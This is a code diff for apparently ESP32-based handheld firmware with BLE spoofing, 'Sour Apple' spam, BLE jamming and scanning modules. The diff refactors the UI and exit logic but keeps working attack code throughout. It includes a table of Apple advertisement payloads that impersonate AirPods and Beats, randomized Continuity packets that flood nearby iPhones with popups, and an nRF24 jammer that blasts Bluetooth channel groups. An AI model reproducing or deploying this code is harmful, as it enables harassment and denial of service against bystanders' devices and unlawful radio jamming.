@@ -1,20 +1,40 @@
-#include "bleconfig.h"
-#include "shared.h"
-#include "icon.h"
+#include "SettingsStore.h"
 #include "Touchscreen.h"
+#include "config.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "icon.h"
+#include "shared.h"
 
-/*
-   BleSpoofer
 
-*/
+#ifdef TFT_BLACK
+#undef TFT_BLACK
+#endif
+#define TFT_BLACK FEATURE_BG
+
+#ifndef FEATURE_TEXT
+#define FEATURE_TEXT ORANGE
+#endif
+#ifndef FEATURE_WHITE
+#define FEATURE_WHITE 0xFFFF
+#endif
+
+#ifdef TFT_WHITE
+#undef TFT_WHITE
+#endif
+#define TFT_WHITE FEATURE_TEXT
+
+#ifdef WHITE
+#undef WHITE
+#endif
+#define WHITE FEATURE_WHITE
+
+#ifdef DARK_GRAY
+#undef DARK_GRAY
+#endif
+#define DARK_GRAY UI_FG
 
 namespace BleSpoofer {
-
-#define BTN_UP     6
-#define BTN_DOWN   3
-#define BTN_LEFT   4
-#define BTN_RIGHT  5
-#define BTN_SELECT 7
 
 #define SCREEN_HEIGHT 250
 #define LINE_HEIGHT 12
@@ -63,41 +83,23 @@ int attack_state = 1;
 int device_choice = 0;
 int device_index = 0;
 
-// Payload data
 const uint8_t DEVICES[][31] = {
-  // Airpods
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Airpods Pro
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Airpods Max
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Airpods Gen 2
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Airpods Gen 3
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Airpods Pro Gen 2
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Power Beats
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Power Beats Pro
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Solo Pro
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Studio Buds
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Flex
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats X
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Solo 3
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Studio 3
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Studio Pro
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Betas Fit Pro
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  // Beats Studio Buds Plus
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 };
 
@@ -106,16 +108,6 @@ BLEAdvertisementData getAdvertismentData() {
 
   if (device_choice == 0) {
     oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
-  }
-
-  int adv_type_choice = random(3);
-
-  if (adv_type_choice == 0) {
-    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-  } else if (adv_type_choice == 1) {
-    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
-  } else {
-    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
   }
 
   return oAdvertisementData;
@@ -209,12 +201,6 @@ void updateSpoofer() {
     case 4: tft.setCursor(60, 310); tft.print("NONCONN"); break;
     case 5: tft.setCursor(60, 310); tft.print("DIRECT LOW"); break;
   }
-
-  //tft.setCursor(5, 275);
-  //tft.print("Advertising:");
-
-  //tft.setCursor(80, 275);
-  //tft.print(isAdvertising ? "Active" : "Disable");
 
 }
 
@@ -451,7 +437,6 @@ void toggleAdvertising() {
       }
 
       BLEAdvertisementData oAdvertisementData = getAdvertismentData();
-      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
       pAdvertising->addServiceUUID(devices_uuid);
       pAdvertising->setAdvertisementData(oAdvertisementData);
       pAdvertising->setMinInterval(0x20);
@@ -459,8 +444,6 @@ void toggleAdvertising() {
       pAdvertising->setMinPreferred(0x20);
       pAdvertising->setMaxPreferred(0x20);
       pAdvertising->start();
-      delay(delayMillisecond);
-      //pAdvertising->stop();
 
       Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
       Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
@@ -479,7 +462,7 @@ void runUI() {
     bitmap_icon_sort_up_plus,
     bitmap_icon_key,
     bitmap_icon_power,
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_go_back
   };
 
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
@@ -512,7 +495,6 @@ void runUI() {
         case 1: changeDeviceTypeNext(); break;
         case 2: changeAdvTypeNext(); break;
         case 3: toggleAdvertising(); break;
-        case 4: feature_exit_requested = true; break;
       }
     } else if (animationState == 2) {
       animationState = 0;
@@ -525,19 +507,22 @@ void runUI() {
   const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+  int x, y;
+  if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              if (i == 4) {
+                feature_exit_requested = true;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
             }
             break;
           }
@@ -549,7 +534,6 @@ void runUI() {
 }
 
 void spooferSetup() {
-
   tft.fillScreen(TFT_BLACK);
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
@@ -563,13 +547,12 @@ void spooferSetup() {
   tft.setTextColor(TFT_WHITE);
   tft.setTextSize(1);
   tft.setCursor(5, 24);
-  //tft.print("BLE Spoofer");
 
   updateSpoofer();
   runUI();
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
 
   Printspoofer("[!!] System Diagnostics", TFT_RED, true);
 
@@ -580,13 +563,9 @@ void spooferSetup() {
 
   Printspoofer("[+] System Ready!", TFT_GREEN, true);
 
-  BLEDevice::init("AirPods 69");
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
   BLEServer *pServer = BLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
-  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-  //delay(500);
 
   pcf.pinMode(BTN_UP, INPUT_PULLUP);
   pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
@@ -599,34 +578,39 @@ void spooferSetup() {
 }
 
 void spooferLoop() {
-  runUI();
-  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
-  //updateStatusBar();
+  static unsigned long lastUpdate = 0;
+  const unsigned long updateInterval = 50;
 
-  handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
-  handleButtonPress(BTN_LEFT, changeDeviceTypePrev);
-  //handleButtonPress(BTN_LEFT, changeAdvTypePrev);
-  handleButtonPress(BTN_DOWN, changeAdvTypeNext);
-  handleButtonPress(BTN_UP, toggleAdvertising);
+  unsigned long now = millis();
+  if (now - lastUpdate >= updateInterval) {
+    lastUpdate = now;
 
-  delay(50);
+    if (feature_active && isButtonPressed(BTN_SELECT)) {
+      feature_exit_requested = true;
+      return;
+    }
+
+    runUI();
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+
+    handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
+    handleButtonPress(BTN_LEFT, changeDeviceTypePrev);
+
+    handleButtonPress(BTN_DOWN, changeAdvTypeNext);
+    handleButtonPress(BTN_UP, toggleAdvertising);
   }
 }
 
+void exit() {
 
-
-/*
-   SourApple
-
-
-*/
+  if (isAdvertising && pAdvertising) {
+    pAdvertising->stop();
+    isAdvertising = false;
+  }
+}
+}
 
 namespace SourApple {
-
-#include <BLEDevice.h>
-#include <BLEUtils.h>
-#include <BLEServer.h>
-
 static bool uiDrawn = false;
 
 #define SCREEN_WIDTH  240
@@ -651,11 +635,10 @@ int currentLine = 0;
 int lineNumber = 1;
 const int lineHeight = 14;
 
-
 void runUI() {
 
   static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_go_back
   };
 
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
@@ -697,19 +680,14 @@ void runUI() {
   const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+  int x, y;
+  if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              feature_exit_requested = true;
             }
             break;
           }
@@ -722,7 +700,7 @@ void runUI() {
 
 void updatedisplay() {
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   runUI();
   tft.setTextColor(TFT_GREEN, TFT_BLACK);
   tft.setTextSize(1);
@@ -754,15 +732,14 @@ void addLineToDisplay(String newLine) {
 void displayAdvertisementData() {
   String lineStr = String(lineNumber) + " -> ";
   lineNumber++;
-  // Convert the advertisement data to a readable string format
-  //String dataStr = "Type: 0x";
+
   String dataStr = "0x";
   dataStr += String(packet[1], HEX);
-  //dataStr += ", CompID: 0x";
+
   dataStr += ",0x";
   dataStr += String(packet[2], HEX);
   dataStr += String(packet[3], HEX);
-  //dataStr += ", ActType: 0x";
+
   dataStr += ",0x";
   dataStr += String(packet[7], HEX);
 
@@ -774,20 +751,20 @@ BLEAdvertisementData getOAdvertisementData() {
   BLEAdvertisementData advertisementData = BLEAdvertisementData();
   uint8_t i = 0;
 
-  packet[i++] = 17 - 1;                             // Packet Length
-  packet[i++] = 0xFF;                               // Packet Type (Manufacturer Specific)
-  packet[i++] = 0x4C;                               // Packet Company ID (Apple, Inc.)
-  packet[i++] = 0x00;                               // ...
-  packet[i++] = 0x0F;                               // Type
-  packet[i++] = 0x05;                               // Length
-  packet[i++] = 0xC1;                               // Action Flags
+  packet[i++] = 17 - 1;
+  packet[i++] = 0xFF;
+  packet[i++] = 0x4C;
+  packet[i++] = 0x00;
+  packet[i++] = 0x0F;
+  packet[i++] = 0x05;
+  packet[i++] = 0xC1;
   const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-  packet[i++] = types[rand() % sizeof(types)];      // Action Type
-  esp_fill_random(&packet[i], 3);                   // Authentication Tag
+  packet[i++] = types[rand() % sizeof(types)];
+  esp_fill_random(&packet[i], 3);
   i += 3;
-  packet[i++] = 0x00;                               // ???
-  packet[i++] = 0x00;                               // ???
-  packet[i++] =  0x10;                              // Type ???
+  packet[i++] = 0x00;
+  packet[i++] = 0x00;
+  packet[i++] =  0x10;
   esp_fill_random(&packet[i], 3);
 
   advertisementData.addData(std::string((char *)packet, 17));
@@ -796,7 +773,6 @@ BLEAdvertisementData getOAdvertisementData() {
 
 void sourappleSetup() {
 
-  tft.setRotation(0);
   tft.setTextSize(1);
   tft.fillScreen(TFT_BLACK);
 
@@ -806,11 +782,10 @@ void sourappleSetup() {
   setupTouchscreen();
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
 
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
-  BLEDevice::init("");
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);
@@ -818,13 +793,15 @@ void sourappleSetup() {
   BLEServer *pServer = BLEDevice::createServer();
   Advertising = pServer->getAdvertising();
 
-  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-
-
 }
 
 void sourappleLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
   runUI();
 
@@ -837,7 +814,6 @@ void sourappleLoop() {
   }
   BLEAdvertisementData oAdvertisementData = getOAdvertisementData();
 
-  Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
   Advertising->addServiceUUID(device_uuid);
   Advertising->setAdvertisementData(oAdvertisementData);
 
@@ -851,29 +827,16 @@ void sourappleLoop() {
   delay(40);
   displayAdvertisementData();
 }
+
+void exit() {
+
+  if (Advertising) {
+    Advertising->stop();
+  }
+}
 }
 
-
-/*
-   BleJammer
-
-
-*/
-
 namespace BleJammer {
-
-#define CE_PIN_1  16
-#define CSN_PIN_1 17
-#define CE_PIN_2  26
-#define CSN_PIN_2 27
-#define CE_PIN_3  4
-#define CSN_PIN_3 5
-
-#define BTN_UP       6
-#define BTN_DOWN     3
-#define BTN_LEFT     4
-#define BTN_RIGHT    5
-#define BTN_SELECT   7
 
 RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
 RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
@@ -892,7 +855,7 @@ byte channelGroup1[] = {2, 5, 8, 11};
 byte channelGroup2[] = {26, 29, 32, 35};
 byte channelGroup3[] = {80, 83, 86, 89};
 
-#define SCREEN_HEIGHT 300
+#define SCREEN_HEIGHT 320
 #define LINE_HEIGHT 12
 #define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)
 
@@ -907,7 +870,7 @@ unsigned long lastButtonPressTime = 0;
 const unsigned long debounceDelay = 500;
 
 void scroll() {
-  for (int i = 3; i < MAX_LINES - 1; i++) {
+  for (int i = 0; i < MAX_LINES - 1; i++) {
     Buffer[i] = Buffer[i + 1];
     Buffercolor[i] = Buffercolor[i + 1];
   }
@@ -929,8 +892,8 @@ void Print(String text, uint16_t color, bool extraSpace = false) {
     Index++;
   }
 
-  for (int i = 3; i < Index; i++) {
-    int yPos = i * LINE_HEIGHT + 15;
+  for (int i = 0; i < Index; i++) {
+    int yPos = (i * LINE_HEIGHT) + 48;
 
     tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
 
@@ -1070,30 +1033,20 @@ void checkModeChange() {
 
     String jammerText = "[!] Jammer ";
     jammerText += (jammerActive) ? "Activated" : "Deactivated";
-    Print(jammerText, jammerActive ? TFT_RED : TFT_RED, false);
+    Print(jammerText, jammerActive ? TFT_GREEN : TFT_GREEN, false);
   }
 }
 
 void blejamSetup() {
 
-  tft.fillScreen(TFT_BLACK);
-  tft.setRotation(0);
+  initializeRadios();
 
+  tft.fillScreen(TFT_BLACK);
   setupTouchscreen();
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   updateTFT();
-
-  Print("===== System Diagnostics =====", TFT_CYAN, false);
-  Print("Initializing TFT display...", TFT_WHITE, false);
-
-  initializeRadios();
-
-  Print("[*] Disabling Bluetooth & WiFi...", TFT_WHITE, false);
-  Print("[*] Bluetooth & WiFi disabled.", TFT_WHITE, false);
-
-  Print("[*] Initializing PCF8574...", TFT_WHITE, false);
 
   pcf.pinMode(BTN_UP, INPUT_PULLUP);
   pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
@@ -1106,7 +1059,11 @@ void blejamSetup() {
 
 void blejamLoop() {
 
-  //updateStatusBar();
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   checkModeChange();
 
   if (jammerActive) {
@@ -1126,22 +1083,15 @@ void blejamLoop() {
     }
   }
 }
+
+void exit() {
+
+  jammerActive = false;
+  initializeRadios();
+}
 }
 
-
-/*
-   BleScan
-
-
-
-*/
-
 namespace BleScan {
-
-#define BTN_UP 6
-#define BTN_DOWN 3
-#define BTN_RIGHT 5
-#define BTN_LEFT 4
 
 #define SCREEN_WIDTH  240
 #define SCREENHEIGHT 320
@@ -1169,8 +1119,47 @@ static bool uiDrawn = false;
 static int iconX[ICON_NUM] = {210, 10};
 static const unsigned char* icons[ICON_NUM] = {
   bitmap_icon_undo,
-  bitmap_icon_go_back // Added back icon
+  bitmap_icon_go_back
 };
+
+static TaskHandle_t bgBleScanTaskHandle = nullptr;
+static volatile bool bgHasResults = false;
+static volatile uint32_t bgLastScanMs = 0;
+static const uint32_t BG_BLE_SCAN_INTERVAL_MS = 15000;
+static bool bleInitDone = false;
+static const uint32_t BG_BOOT_GRACE_MS = 6000;
+static uint32_t bgBootMs = 0;
+
+static void ensureBleInit() {
+  if (bleInitDone) return;
+
+  bleScan = BLEDevice::getScan();
+  bleScan->setActiveScan(true);
+  bleInitDone = true;
+}
+
+static void bgBleScanTask(void* ) {
+  ensureBleInit();
+  for (;;) {
+    const uint32_t now = millis();
+    if (bgBootMs == 0) bgBootMs = now;
+
+    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
+    if (settings().autoBleScan && idleOk && !feature_active && !in_sub_menu) {
+      isScanning = true;
+
+      bleResults = bleScan->start(2, false);
+      isScanning = false;
+      if (bleResults.getCount() >= 0) {
+        bgHasResults = (bleResults.getCount() > 0);
+        bgLastScanMs = now;
+      }
+      vTaskDelay(BG_BLE_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
+    } else {
+      vTaskDelay(1000 / portTICK_PERIOD_MS);
+    }
+  }
+}
 
 void displayScanning() {
   tft.fillRect(0, 37, 240, 320, TFT_BLACK);
@@ -1199,9 +1188,15 @@ void startBLEScan() {
   isScanning = true;
   screenNeedsUpdate = true;
   fullScreenUpdate = true;
+  ensureBleInit();
   bleResults = bleScan->start(5, false);
   isScanning = false;
   screenNeedsUpdate = true;
+
+  if (bleResults.getCount() >= 0) {
+    bgHasResults = (bleResults.getCount() > 0);
+    bgLastScanMs = millis();
+  }
 }
 
 void handleButtons() {
@@ -1346,7 +1341,6 @@ void displayBLEDetails() {
   }
 }
 
-
 void runUI() {
 
   static int iconY = STATUS_BAR_Y_OFFSET;
@@ -1379,7 +1373,7 @@ void runUI() {
             startBLEScan();
           }
           break;
-        case 1: // Back icon action (exit to submenu)
+        case 1:
            feature_exit_requested = true;
           break;
       }
@@ -1394,11 +1388,8 @@ void runUI() {
   const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+  int x, y;
+  if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
@@ -1419,7 +1410,6 @@ void runUI() {
 
 void bleScanSetup() {
 
-  tft.setRotation(0);
   tft.fillScreen(TFT_BLACK);
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setTextSize(1);
@@ -1428,7 +1418,7 @@ void bleScanSetup() {
   uiDrawn = false;
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   runUI();
 
   setupTouchscreen();
@@ -1438,19 +1428,29 @@ void bleScanSetup() {
   pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
   pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
 
-  BLEDevice::init("");
-  bleScan = BLEDevice::getScan();
-  bleScan->setActiveScan(true);
+  ensureBleInit();
 
-  startBLEScan();
+  if (bgHasResults && bleResults.getCount() > 0) {
+    screenNeedsUpdate = true;
+    fullScreenUpdate = true;
+    updateBLEList();
+  } else {
+    startBLEScan();
+  }
 }
 
 void bleScanLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
   handleButtons();
 
-  updateStatusBar();
   runUI();
+  updateStatusBar();
 
   if (screenNeedsUpdate) {
     screenNeedsUpdate = false;
@@ -1464,21 +1464,39 @@ void bleScanLoop() {
     if (fullScreenUpdate) fullScreenUpdate = false;
   }
 }
+
+void startBackgroundScanner() {
+  if (bgBleScanTaskHandle != nullptr) return;
+  xTaskCreatePinnedToCore(
+    bgBleScanTask,
+    "bgBleScan",
+    4096,
+    nullptr,
+    1,
+    &bgBleScanTaskHandle,
+    0
+  );
 }
 
+int getLastCount() {
 
-/*
-   2.4GHz Scanner
+  if (!settings().autoBleScan) return 0;
+  return bleResults.getCount();
+}
 
+void exit() {
 
-
-*/
+  if (isScanning && bleScan) {
+    bleScan->stop();
+    isScanning = false;
+  }
+}
+}
 
 namespace Scanner {
 
-#define CE  16
-#define CSN 17
-#define BUTTON 27
+#define CE  14
+#define CSN 21
 
 #define CHANNELS  128
 int channel[CHANNELS];
@@ -1488,7 +1506,12 @@ uint8_t values[N];
 
 static bool uiDrawn = false;
 
-#define BTN_SELECT 7
+static constexpr uint16_t SCAN_SWEEPS        = 25;
+static constexpr uint16_t DISPLAY_SWEEPS     = 15;
+static constexpr uint16_t RX_SETTLE_US       = 100;
+static constexpr uint16_t RPD_DWELL_US       = 50;
+static constexpr uint32_t UI_THROTTLE_MS     = 35;
+static constexpr uint16_t BUTTON_POLL_STRIDE = 8;
 
 #define _NRF24_CONFIG   0x00
 #define _NRF24_EN_AA    0x01
@@ -1509,7 +1532,7 @@ uint16_t Buffercolor[MAX_LINES];
 int Index = 0;
 
 bool isSelectButtonPressed() {
-  return pcf.digitalRead(BTN_SELECT) == LOW;  
+  return pcf.digitalRead(BTN_SELECT) == LOW;
 }
 
 byte getRegister(byte r) {
@@ -1559,7 +1582,6 @@ void setRX() {
   delayMicroseconds(100);
 }
 
-
 void scroll() {
   for (int i = 3; i < MAX_LINES - 1; i++) {
     Buffer[i] = Buffer[i + 1];
@@ -1602,11 +1624,12 @@ void calibrateBackgroundNoise() {
     disable();
     for (int j = 0; j < 50; j++) {
       for (int i = 0; i < CHANNELS; i++) {
-        setRegister(_NRF24_RF_CH, (128 * i) / CHANNELS);
-        setRX();
-        delayMicroseconds(50);
+
+        setRegister(_NRF24_RF_CH, (uint8_t)i);
+        enable();
+        delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
         disable();
-        if (getRegister(_NRF24_RPD) > 0) channel[i]++;
+        if (carrierDetected()) channel[i]++;
       }
     }
     Print(".", TFT_WHITE, false);
@@ -1629,11 +1652,12 @@ void scan() {
   disable();
   for (int j = 0; j < 50; j++) {
     for (int i = 0; i < CHANNELS; i++) {
-      setRegister(_NRF24_RF_CH, (128 * i) / CHANNELS);
-      setRX();
-      delayMicroseconds(50);
+
+      setRegister(_NRF24_RF_CH, (uint8_t)i);
+      enable();
+      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
       disable();
-      if (getRegister(_NRF24_RPD) > 0) channel[i]++;
+      if (carrierDetected()) channel[i]++;
     }
   }
 }
@@ -1650,9 +1674,9 @@ void runUI() {
   static int iconY = STATUS_BAR_Y_OFFSET;
 
   static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_undo,   
+    bitmap_icon_undo,
     bitmap_icon_start,
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_go_back
   };
 
   if (!uiDrawn) {
@@ -1675,7 +1699,7 @@ void runUI() {
   }
 
   static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;  
+  static int animationState = 0;
   static int activeIcon = -1;
 
   if (animationState > 0 && millis() - lastAnimationTime >= 150) {
